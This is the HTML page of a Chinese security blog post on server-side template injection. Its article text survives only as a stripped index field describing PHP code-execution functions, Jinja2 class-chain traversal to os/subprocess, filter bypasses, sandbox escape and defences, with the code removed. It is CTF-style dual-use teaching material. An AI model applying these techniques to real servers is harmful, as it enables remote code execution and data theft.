<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>浅析SSTI漏洞 | hybcx</title><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="浅析SSTI漏洞"><meta name="application-name" content="浅析SSTI漏洞"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="浅析SSTI漏洞"><meta property="og:url" content="http://hybcx.xyz/2023/08/06/qian-xi-ssti-lou-dong/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="SSTI注入姿势 一、常见代码执行函数 代码执行函数主要有（9个）：eval()，assert()，call_user_func()，create_function()，array_map()，call_user_func_array()，array_filter()，uasort()，preg_r"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="SSTI注入姿势 一、常见代码执行函数 代码执行函数主要有（9个）：eval()，assert()，call_user_func()，create_function()，array_map()，call_user_func_array()，array_filter()，uasort()，preg_r"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/08/06/qian-xi-ssti-lou-dong/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: '浅析SSTI漏洞',
  postAI: '',
  pageFillDescription: 'SSTI注入姿势, 一、常见代码执行函数, 1- eval(), 特别注意：php中@是干什么的, 2- assert()  --（最好不要加上分号作为结尾）, 3- call_user_func(), 4- create_function(), 5- array_map(), 6- call_user_func_array(), 7- array_filter(), 8- uasort()函数, 9- preg_replace(), 二、常见命令执行函数, 1- system(), 2-passthru(), 3- exec(), 4- pcntl_exec(), 5- shell_exec(), 6- popen()/proc_open(), 7- 反引号 ``, 三、注入流程以及必要函数的用法, 2.1. 初识SSTI, 1. 什么是SSTI？, 2. render_template渲染函数是什么, 3. 注入的思想, 4. 什么是模板引擎, 5. 引发SSTI的真正原因, 6. route装饰器路由, 7. main入口, 8. 模板渲染（重点）, 2.2. 判断SSTI类型, 1. 常见的模板引擎, 2. 如何测试是否存在SSTI, 3. 靶场实战, 4. SSTI利用思路, 2.3 常用类, 魔术对象, 用魔术对象构造一个简单的语句, dir()与__dict__, 2.4 常见的playload, 2.5 常见的命令执行方式, os.system(), os.popen(), warnings.catchwarning, values, __builtins__内建函数, 绕过, 过滤双下划线__, 过滤花括号, 过滤引号, 过滤了单双引号和中括号, 过滤关键字, 字符串拼接绕过, 过滤 _, 过滤os, 过滤args, 引号内十六进制绕过,  ’ chr等被过滤无法引入字符串, 过滤数字, 使用 Jinja2 过滤器绕过, 2.6 一些姿势, 1. config, 2. self, 3.   、 [] 、 () 等数据结构, 4、url_for g request namespace lipsum range session dictget_flashed_messages cycler joiner config等, 5. 在URL执行py命令格式, 2.7 常用到的payload, SSTI常用的语句格式, 绕过SSTI过滤, 符号的过滤, 过滤了点号, 过滤了中括号, 2.8 脚本, 1. 寻找内建函数 eval 执行命令, 2. 寻找 os 模块执行命令, 3. 寻找 popen 函数执行命令, 4. 寻找 importlib 类执行命令, 5. 寻找 linecache 函数执行命令, 6. 寻找 subprocess.Popen 类执行命令, 四、沙箱逃逸, 4.1 原理, 4.2 函数导入限制和绕过, 1. import, 2. builtins, 3. 魔法函数, 4. 类继承使用, 5. 特殊函数查找, 5.1 python3, 5.2 python2, 五、PHP-smarty模板, 1. Smarty-SSTI常规利用方式, 2. CTF漏洞成因, 3. PHP的模板注入, 六、PHP-Blade模板, 七、PHP-Twig引擎, 八、Python-tornado模板, 九、Python-Django模板, 十、Java-velocity模板, 1. 基本语法, 十一、Java-FreeMarker, 十二、自动化工具, 十三、漏洞防御注入姿势一常见代码执行函数代码执行函数主要有个传入的参数必须为代码即需要以分号结尾命令執行菜刀连接密码特别注意中是干什么的屏蔽掉出错信息有时就算连接出错也不会报错的原因是防止别人根据错误提示信息来推测出你的数据库结构进行注入攻击一类的黑客行为最好不要加上分号作为结尾函数是直接将传入的参数当成代码不需要以分号结尾特别注意有时加上分号不会显示结果命令執行菜刀连接密码传入的参数作为函数的参数命令执行菜刀连接密码创建匿名函数执行代码执行命令和上传文件参考函数必须加分号函数将用户自定义函数作用到数组中的每个值上并返回用户自定义函数作用后的带有新值的数组回调函数接受的参数数目应该和传递给函数的数组数目一致命令执行菜刀连接密码将传入的参数作为数组的第一个值传递给函数菜刀连接密码用回调函数过滤数组中的元素数组函数命令执行菜刀连接密码函数环境才能用使用用户自定义的比较函数对数组中的值进行排序并保持索引关联命令执行菜刀连接密码正则规则替换字符目标字符执行命令和上传文件参考函数不需要加分号将目标字符中符合正则规则的字符替换为替换字符此时如果正则规则中使用修饰符则存在代码执行漏洞这里可以使用函数转换编码来执行代码二常见命令执行函数命令执行函数主要有个反引号作用将字符串作为命令执行自带输出功能作用将字符串作为命令执行不需要输出执行结果且输出全部的内容作用将字符串作为命令执行需要输出执行结果且它只会输出最后一行的内容他的输出结果需要打印不用打印用的不多暂时略过作用将字符串作为命令执行需要输出执行结果且输出全部的内容作用该函数也可以将字符串当作命令来执行但是该函数返回的是文件指针而非命令执行结果该函数有两个参数此时的实际上就是把执行结果放入文件通过访问文件查看执行结果反引号作用反引号里面的代码也会被当作命令来执行或者详解查看是干什么的三注入流程以及必要函数的用法变量块用于将表达式打印到模板输出注释块注释控制块可以声明变量也可以执行语句行声明可以有和相同的效果类的一个内置属性表示实例对象的类类型对象的直接基类类型对象的全部基类以元组形式类型的实例通常没有属性此属性是由类组成的元组在方法解析期间会基于它来查找基类返回这个类的子类集合初始化类返回的类型是使用方式是函数名获取所处空间下可使用的方法以及所有变量类的静态函数类函数普通函数全局变量以及一些内置的属性都是放在类的里实例类函数都具有的魔术方法事实上在实例化的对象进行操作的时候形如都会自动去调用方法因此我们同样可以直接通过这个方法来获取到实例类函数的属性调用字典中的键值其实就是调用这个魔术方法比如就是内建名称空间内建名称空间有许多名字到对象之间映射而这些名字其实就是内建函数的名称对象就是这些内建函数本身即里面有很多常用的函数与的区别就不放了百度都有动态加载类和函数也就是导入模块经常用于导入模块返回描写这个对象的字符串可以理解成就是打印出来的一个方法可以用于得到而且含有的一个方法可以用于得到而且含有的一个方法可以用于得到而且含有模块应用上下文一个全局变量可以用于获取字符串来绕过包括下面这些引用一下羽师傅的此外同样可以获取函数传参所有参数参数请求头参数传参或传参传当前的所有配置此外也可以这样得到将值转换为类型将值转换为类型将字符串转换为小写将字符串转换为大写把值中的每个单词的首字母都转成大写把变量值的首字母转成大写其余字母转小写截取字符串前面和后面的空白字符计算一个长字符串中单词的个数字符串反转替换将替换为的字符串截取长度的字符串删除字符串中所有的标签如果出现多个空格将替换成一个空格或转义字符会将等符号转义成中的符号显例或禁用转义如果开启了全局转义那么过滤器会将变量关掉转义示例将变量列成列表将变量转换成字符串将一个序列中的参数值拼接成字符串示例看上面返回一个数值的绝对值返回一个序列的第一个元素返回一个序列的最后一个元素格式化字符串比如将输出返回一个序列或者字典的长度返回列表内数值的和返回排序后的列表如果当前变量没有值则会使用参数中的值来代替示例如果不存在则会使用来替代默认是在只有这个变量为的时候才会使用中的值如果想使用的形式判断是否为则可以传递也可以使用来替换返回字符串的长度别名是初识什么是就是服务器端模板注入实际上也是一种注入漏洞可能对大家而言不是很熟悉但是相信大家很熟悉注入实际上这两者的思路都是相同的因此可以类比来分析渲染函数是什么就是把涉及的页面与用户数据分离开这样方便展示和管理当用户输入自己的数据信息页面可以根据用户自身的信息来展示页面因此才有了这个函数的使用注入的思想用函数不断调用我们要使用的命令等等命令我们用这些来读取写入配置文件什么是模板引擎是为了使用户界面和业务数据内容分离而产生的它可以生成特定格式的文档利用模板引擎来生成前端的代码模板引擎会提供一套生成代码的程序之后只需获取用户的数据放入渲染函数该数据便会嵌入生成好的页面中然后反馈给浏览器呈现在用户面前当前的主流框架一般都采用模式即用户的输入先进入控制器然后根据清流类型和请求的指令发送给对应的业务模型由层进行业务逻辑的判断数据库的存取等最后把结果返回给视图层再经模板引擎的渲染展示给用户模板引擎的基本机理就是替换转换将指定的标签转换为需要的业务数据将指定的伪语句按照某种流程来变换输出引用一段代码来简单说一下模板用于匹配的正则用于过滤出以开头结尾并且中间不包含或的匹配项其目的在于过滤出中的和数据模板引擎使用全局正则表达式意味着在循环中使用因为它仍然会检索所有匹配的子表达式仅返回找到的第一个匹配项最终的执行在此处上述代码我们的目的是将数据文件中对应的和替换到模板文件中主要的执行在模板引擎的函数中会返回一个这个数组中包含了多个项目为什么会包含两项呢当正则表达式设置标志位时可以多次执行方法来查找同一个字符串中的成功匹配之后等同于完成模板中数据的替换引发的真正原因渲染函数的问题渲染函数在渲染的时候往往对用户输入的变量不做渲染也就是说例如在中作为变量包裹标识符在渲染的时候会把包裹的内容当做变量解析替换比如会被解析成如此一来就可以实现如同注入一样的注入漏洞还比如说由前面模板代码安利的演示我们可以发现若服务端接受了用户的输入后比如对于上述案例的和的数据由数据的输入提交请求而得未经任何处理就将其作为应用模板内容的一部分就会导致模板引擎在进行目标编译渲染的过程中执行了用户插入的可执行语句从而可能导致信息泄露代码执行等问题凡是使用模板的地方是绕不过的问题模板引擎可由多种语言实现所以也就出现在了多种语言环境中模板引擎设计出来的一种防护机制不允许使用没有定义或者声明的模块这适用于所有的模板引擎装饰器路由使用装饰器告诉什么样的能触发我们的函数装饰器把一个函数绑定到对应的上这句话相当于路由一个路由跟随一个函数如访问则会输出我们修改一下规则这个时候访问会输出此外还可以设置动态网址根据里的输入动态辨别身份此时便可以看到如下页面或者可以使用型转换器有下面几种接受整数同但是接受浮点数和默认的相似但也接受斜线入口当文件被直接运行时之下的代码块将被运行当文件以模块形式被导入时之下的代码块不被运行如果你经常以方式运行自己写的小脚本那么不需要这个东西但是如果需要做一个稍微大一点的开发写是一个良好的习惯大一点的脚本要分开几个文件来写一个文件要使用另一个文件也就是模块此时这个就会起到作用不会运行而是类似于文件包含来使用测试的时候我们可以使用方便调试增加一句或者效果是一样的这样我们修改代码的时候直接保存网页刷新就可以了如果不加那么每次修改代码都要运行一次程序并且把前一个程序关闭否则会被前一个程序覆盖这会让操作系统监听所有公网此时便可以在公网上看到自己的模板渲染重点你可以使用方法来渲染模板你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量这里有一个展示如何渲染模板的简例简单的模版渲染示例我们模板未创建所以这段代码暂时供观赏不妨往下继续看我们从模板渲染开始实例因为我们毕竟不是做开发的以模板注入闻名所以我们先从模版渲染入手深入剖析首先要搞清楚模板渲染体系函数渲染的是中的模板所谓模板是我们自己写的里面的参数需要我们根据每个用户需求传入动态变量我们写一个文件写文件夹中小猪佩奇里面有两个参数需要我们渲染以及我们在文件里进行渲染我们访问或者都会跳转小猪佩奇传入一个字典数组这次渲染我们没有使用用户可控所以是安全的如果我们交给用户可控并且不过滤参数就有可能造成模板注入漏洞判断类型上面提到网站模板引擎有等等那么如何判断遇到的是哪种类型广为流传的就是这张图了根据处理返回值的不同来进行判别注意括号的数量等常见的模板引擎模板变量模板变量模板变量模板变量模板变量模板变量模板变量模板变量模板引擎众多各个模板引擎的语法也不尽相同我们最主要的是能定位出是否存在漏洞至于后续的利用我们掌握一些其余的见到再查即可是一种面向的现代和设计友好的模板语言它是以的模板为模型的是框架的一部分会把模板参数提供的相应的值替换了块模板同样支持控制语句像在块中控制结构可以声明变量也可以执行语句变量取值用于将表达式打印到模板输出注释块用于注释如何测试是否存在简单来说就是更改请求参数使之承载含有模板引擎语法的通过页面渲染返回的内容检测承载的是否有得到编译解析有解析则可以判定含有对应模板引擎注入否则不存在此处我们拿来师傅提供的一段示例代码模板引擎示例代码用于定位模板内置的加载器来存储配置信息内置的环境变量方法通过其第一个参数载入模板并通过第二个参数中的变量来渲染模板重要模版含有变量其模版变量值来自于请求参数将用户输入作为模版变量的值这段代码中由于模板引擎一般都会默认对渲染的变量值进行编码和转义所以一般情况下并不会存在等攻击的可能若就如我们最开始的例子所说若模板引擎渲染的内容受我们控制了就不一定了上述代码基本内容不变后的内容发生变化将用户输入作为模版内容的一部分此时函数由于缺少第二个参数所以直接就会把用户的输入拼如模板进行渲染这就相当于改变了最初的模板由于模板最初是由开发者定义的所以他会受到信任对于模板的变量除了传递变量外还可以执行表达式最简单的表达式就是这也是辨认是否存在最基本的指纹若我们输入页面返回其其结果就说明该表达式被解析存在靶场实战题目直接提示我们本体使用的模板引擎为根据我们之前总结的各个模板引擎的变量类型我们可以知道该变量的类型是所以话不多说我们直接拼接尝试被计算确认存在模板注入本题的重点还是在利用方面由于我们的目标是读取处于服务器本地的一个存有的文件所以我们的重点是找到一个含有某种读取文件的函数的类中我们通过查阅手册发现可以利用函数完成该功能调用该函数会返回一个文件的句柄然后再配合函数读取即可该函数会执行一个子进程执行这个命令同时将子进程的标准输出通过管道连接到父进程对于文件在父进程调用读取即可对于命令在父进程会被执行那么下面的重点就是如何找到这个函数所属的类一般有两种方法我们先说第一种由于我们想要找的是一个子类所以第一步即使找到其对象基类即为了达到这步我们可以使用属性来访问对象的继承类但我们目前没有对象所以这里我们就构造一个空字符串其中用于返回调用的参数类型可以看出该子类继承自与并以一个元组返回我们通过索引获得对象类接下来我们要列举出所有集成自的子类通过对该对象调用方法但这有一个明显的缺点就是好家伙这么多子类怎么可能找得到为了缩小范围我们对其进行切片查找个以后的元素成功定位其位置处于滴号位置然后我们为该函数传递参数调用即可查看本地文件发现与进程交互将数据发送到标准输入从和读取数据直到到达文件结尾之后我们直接他就看见啦剩下的未实操过这里我们还有一种方法使用全局下的内置模块引用指向在中有一个内建模块该模块中有一些常用函数而该模块在启动后且没有执行程序员所写的任何代码前会首先加载该内建函数到内存同样我们获取基本类后继续向下获取基本类的子类然后初始化类全局来查找所有的方法及变量和参数并查看其内建模块的引用使用内建模块中的引入库并适用其中的函数读取即可注意该中对子类的选择时经测试大多数子类中都包含内建模块的引用但依旧有不少不包含要注意我们使用将子类的选择加为参数进行爆破遍历出以下截图中的子类号都可以引用具有以下为不可以使用的由此可看出号往大了写就对了利用思路先上下面分步对每一步代码进行分析首先考虑拿到一个通过字符串元组列表字典均可下一步目的是拿到基类然后获取对应子类在所有的子类中选择一个可用的类去获取全局变量如果这些函数并没有被重载这时他们并不是不具有属性通过某些手段找到某个函数是可用的下一步利用这个类的函数获取到全局变量再获取到全局变量里的中的函数使用命令执行即可常用类先举几个基础的例子方便理解用来查看变量所属的类格式为变量用来查看类的基类注意是类的基类所以格式为变量同时也能加上数组比如变量来获得第一个基类值得一提的是还有个类是它会显示类和基类这是它和的不同查看当前类的子类格式变量这个类也可以加数组来查看指定的索引值例如变量这个时候就可以开始利用类里面的方法了例如变量初始化类然后全局来查找所有的方法及变量及参数由此我们可以看到各种各样的参数方法函数去找一个可利用的来执行比如的话就可以这样利用大概是这么个原理但这样说来还是不知道怎么利用来看几道题就能更深刻理解了之后的题目参考魔术对象返回类型所属的对象返回一个包含对象所继承的基类元组方法在解析时按照元组的顺序解析返回该对象所继承的基类和都是用来寻找基类的获取当前类的所有子类类的初始化方法对包含保存函数全局变量的字典的引用用魔术对象构造一个简单的语句我们在里面运行以下解读一下返回所属的对象返回这个对象所继承的基类找到了这个对象的基类那么就返回这个基类下所具有的子类这就是一个具有的对象继承的基类的所有子类在这里面我们不乏可以找到我们要用的子类如前文所提到的等等那么既然我们要用去做些事情那么我们就要用到这些子类呗如何调用这些子类这样我们就可以调用这些子类了假如我们要去查看某个网页获取那么我们用函数在里面还可以使用在里面已经被移除了但是如果我们想要去获取目录等等就需要用到函数读取目录一般是函数那么我们来看看如何调用得到类中模块的函数列出第一层目录文件因为是库的函数所以是对该函数字典的引用所以我们这下就拿到了字典然后紧接着就是我们要使用的命令有时候函数会被过滤掉我们就使用读取本级目录与是一个函数返回的是是一个字典键为属性名值为属性值返回所有的属性而返回的是非父类的键与对应的值常见的获得基类文件操作找到类读文件写文件命令执行执行下有类可以直接执行命令等全局函数下有等的全局函数可以利用此来执行命令命令执行文件操作下的命令常见的命令执行方式的输出是执行结果的返回值而不是执行命令的输出成功执行返回失败返回因为输出结果不明显所以我们也会用到下面这个命令用法说明模式权限可以是默认或方法通过获取终端输出而且需要关闭当执行成功时不返回任何值失败时返回系统返回值失败返回可见它获取返回值的方式和不同缺点非常强大支持多种参数和模式通过其构造函数可以看到支持很多参数但函数存在缺陷在于它是一个阻塞的方法如果运行命令时产生内容非常多函数就容易阻塞另一点方法也不会打印出的执行信息访问模块还有从模块入手的而这两个模块分别位于元组中的号元素方法用于将对象实例化在这个函数下我们可以通过或者看该模块下有哪些函数注意返回的是字典而可用于读取任意一个文件的某一行而这个函数引用了模块于是还可以挖掘到类似注意都不是直接套用的不同环境请自行测试作用返回字典中的所有值使用以上实例输出结果为内建函数内建函数就是本身就有的启动的时候解释器就会自动解析内建函数里面包括了许多我们需要的函数可以执行命令但是经常会被当我们启动一个解释器时即时没有创建任何变量或者函数还是会有很多函数可以使用我们称之为内建函数内建函数并不需要我们自己做定义而是在启动解释器的时候就已经导入到内存中供我们使用想要了解这里面的工作原理我们可以从名称空间开始方法是做为默认初始模块出现的可用于查看当前所有导入的内建函数该方法会以字典的形式返回当前位置的所有全局变量与等价该属性是函数特有的属性记录当前文件全局变量的值如果某个文件调用了等库但我们只能访问该文件某个函数或者某个对象那么我们就可以利用属性访问全局的变量该属性保存的是函数全局变量的字典引用该方法用于动态加载类和函数如果一个模块经常变化就可以使用来动态载入就是语法模块名这样我们在进行注入的时候就可以通过这种方式使用很多的类和方法通过子类再去获取子类的子类更多的方法找出可以利用的类和方法加以利用总之是通过的对象的继承来一步步实现文件读取和命令执行的这两个用的是同一个模块模块方法绕过拼接编码等价于可以看出单双引号内的都可以编码同理还可以进行进制编码等过滤中括号函数用于移除列表中的一个元素默认最后一个元素并且返回该元素的值若也被过滤使用原生函数将改成字典读取经过测试这种方法在解释器里不能执行但是在测试的题目环境下可以执行过滤双下划线将其中的改为则利用的方式进行传参过滤花括号或者如果不能执行命令读取文件可以利用盲注的方法逐位将内容爆出来过滤引号是中的一个属性为返回请求的参数这里把当作变量名将后面的路径传值进来进而绕过了引号的过滤过滤了单双引号和中括号仍然可以用单双引号的绕过还是利用之前提到的姿势至于中括号的绕过拿点绕过拿等绕过都可以使用绕过的话可以这样过滤关键字编码绕过使用实例访问属性时调用该方法例如被过滤掉关键词字符串拼接绕过过滤利用属性将其中的改为则利用的方式进行传参过滤过滤引号内十六进制绕过是是等被过滤无法引入字符串直接拼接键名利用等过滤器从已有变量里面直接找构造出和后用格式化字符串代替过滤数字例如就想办法构造出数字使用过滤器绕过在中内置了很多过滤器变量可以通过过滤器进行修改过滤器与变量之间用管道符号隔开括号中可以有可选参数也可以没有参数过滤器函数可以带括号也可以不带括号可以使用管道符号连接多个过滤器一个过滤器的输出应用于下一个过滤器内置过滤器列表如下其中常见过滤器用法如下返回参数的绝对值获取对象的属性等价于第一个字符大写所有其他字符小写返回序列的第一项将值转换为浮点数如果转换不起作用将返回将值转换为整数如果转换不起作用将返回返回一个迭代器映射项其他用法详见官方文档使用过滤器构造一般思路是利用这些过滤器逐步拼接出需要的字符数字或字符串对于一般原始字符的获取方法有以下几种通过以上几种返回的字符串中包含尖括号字母空格下划线数字空格百分号点号我们的目标就是使用这些返回的字符串结合各种过滤器拼接出最终的代码解释这段代码是使用模板语言的语法让我逐步解释它的含义这是的赋值语句它创建了一个名为的变量并将其赋值为接下来表达式的结果这是一个表达式由几个操作符组成这是一个空的字典对象这是的过滤器函数之一函数用于选择字典中的项但在这个例子中字典是空的所以它实际上没有进行任何选择这是的过滤器函数之一函数将其输入转换为字符串类型这是的输出表达式它会在模板中显示变量的值综上所述这段代码的作用是创建一个名为的变量并将其赋值为空字典经过选择和字符串转换后的结果然后它将的值输出到模板中由于选择和字符串转换操作并未改变空字典的内容因此最终输出的结果将是一个空字符串实战演示八月安恒月赛题目源码可以看到题目过滤的死死地最关键是把也给过滤了的话这就很麻烦了但是我们还可以用过滤器进行绕过在存在的地方执行如下或可以看到我们得到了一段字符串这段字符串中不仅存在字符还存在空格下划线尖号和数字也就是说如果题目过滤了这些字符的话我们便可以在这个字符串中取到我们想要的字符从而绕过过滤然后我们在使用过滤器将字符串转化为列表如上图所示反回了一个列表列表中是这个字符串的每一个字符接下来我们便可以使用使用等方法将列表里的字符取出来了如下所示我们取一个下划线同理还能取到更多的字符空格这里其实有了数字之后我们便可以依次将其余的数字全部构造出来原理就是加减乘除平方等数学运算如下示例注意这样的加号的是不行的不知道为什么只能用减号配合取绝对值了通过上述原理我们可以依次获得构造所需的特殊字符与字符串首先构造出所需的数字构造出所需的各种字符与字符串空格单引号左括号右括号字符百分号这里构造了之后可以利用这个构造任意字符用于字符连接使用构造斜杠将上面构造的字符或字符串拼接起来构造出如上图所示成功构造出了然后将上面构造的各种变量添加到万能里面就行了所以最终的为参考一些姿势可以获取当前设置如果题目类似那可以直接访问或者得到同样可以找到等数据结构主要目的是配合这样找到类等如果不能使用要获取配置信息就必须从它的上部全局变量访问配置等例如在执行命令格式这是内容常用到的是模块大佬经常用的直接出在导入不了具体哪个子类例如的时候可以用重新导入模块然后进行命令执行当然如果遇到过了了敏感字符记得自己去拼接一下注入顺序先找到一个类型所属的对象在找到这个对象所继承的基类他的功能是谁传授给他的找到他父亲他父亲除了有这个子类还有其他的子类呗这里的类就包括很多的方法了比如我们最需要用到的就是模块来命令执行找到类了将这个类初始化成方法相当于我们调用了模块通过保存对全局变量的引用然后再用模块进行命令执行常用的语句格式直接执行设置变量执行循环别忘了中间那个条件执行绕过过滤再读了一部分的文章再结合自己的做题情况来看对考点总结如下过滤一些字符绕过即可寻找模块进行命令执行主要是对第一个过滤的考察比如说对字符串进行拼接绕过编码绕过等绕过拼接通过等函数替代符号的效果通过的方法进行传参通过的方法我们知道在中用到的符号无非就是五种符号的过滤访问变量属性标准的语法使用点外还可以使用中括号来访问变量的属性也可以使用来访问变量的属性过滤了点号等同于相当于过滤了中括号还有一些其他的访问方法这是拼接绕过这是替代这是反转这是大小写转换对于的话还可以利用进行绕过这是编码绕过脚本寻找内建函数执行命令得到一大堆子类的索引我们可以记下几个含有函数的类寻找模块执行命令的模块中有和这两个函数可用来执行命令其中函数执行命令是没有回显的我们可以使用函数配合外带数据函数执行命令有回显所以比较常用的函数为函数而当函数被过滤掉时可以使用函数代替首先编写脚本遍历目标环境中含有模块的类的索引号可以得到一大堆类但是该方法遍历得到的类不准确因为一些不相关的类名中也存在字符串所以我们还要探索更有效的方法我们可以看到即使是使用模块执行命令其也是调用的模块中的函数那我们也可以直接调用函数存在函数的类一般是但也不绝对由于目标环境的不同我们还需要遍历一下寻找函数执行命令首先编写脚本遍历目标环境中含有函数的类的索引号得到编号为这样得到的索引还是很准确的除了这种方法外我们还可以直接导入模块有一个类可用来导入你需要的模块寻找类执行命令中存在类目的就是提供中语句的实现以及函数我么可以直接利用该类中的将模块导入从而使用模块执行命令首先编写脚本遍历目标环境中类的索引号寻找函数执行命令这个函数可用于读取任意一个文件的某一行而这个函数中也引入了模块所以我们也可以利用这个函数去执行命令首先编写脚本遍历目标环境中含有这个函数的子类的索引号寻找类执行命令从版本开始可以用这个模块来产生子进程并连接到子进程的标准输入输出错误中去还可以得到子进程的返回值意在替代其他几个老的模块或者函数比如等函数首先编写脚本遍历目标环境中含有这个函数的子类的索引号四沙箱逃逸原理沙盒沙箱沙箱在早期主要用于测试可疑软件测试病毒危害程度等等在沙箱中运行即使病毒对其造成了严重危害也不会威胁到真实环境沙箱重构也十分便捷有点类似虚拟机的利用沙箱逃逸就是在给我们的一个代码执行环境下脱离种种过滤和限制最终成功拿到权限的过程其实就是闯过重重黑名单最终拿到系统命令执行权限的过程而我们这里主要讲解的是环境下的沙箱逃逸的沙箱逃逸就是在一个严格限制的环境中通过绕过限制和过滤达到执行更高权限甚至的过程既然是想或者说是执行命令就需要一个可执行命令的包可直接执行命令的模块有有些时候比如我们并不需要去执行命令而是去读取目录下的文件即可也就是说需要文件读取的模块来执行常用的文件读取模块不过其中只在中执行左右函数导入限制和绕过一个受限制的环境禁止导入敏感的包是最常见的方法所以一般是最容易被限制掉这种简单的限制不能导入包的形式可以中间添加空格来绕过或者使用其他方式导入包比如还可以使用编码的方式绕过对导入包关键字的检查比如使用中适用或者或者使用字符串拼接的方式字符串翻转截取再万一他是这么禁止的这样的话不管怎么换导入函数都会被禁止那么是否有不直接使用关键字来导入的方式既然需要导入也就是只需要能执行对应的库就可以使用不过在这之前需要判断得到库的物理路径如果模块没被禁用的话就可以使用来获取物理路径这种方式只能用在中取消了系统下默认路径可以利用读取文件配合来执行不可以执行利用打开读取需要执行的是其中的内容直接打开的时候执行的就是读取文件操作使用的形式或者使用字符串拼接的方式但是需要跟一起利用这里不需要导入就可以直接引用当然不需要导入就可以引用的函数不止这一个因为一个内建函数的原因即时引用在程序还为执行代码的时候就已经加载进来了此模块并不需要导入可以在任何模块中执行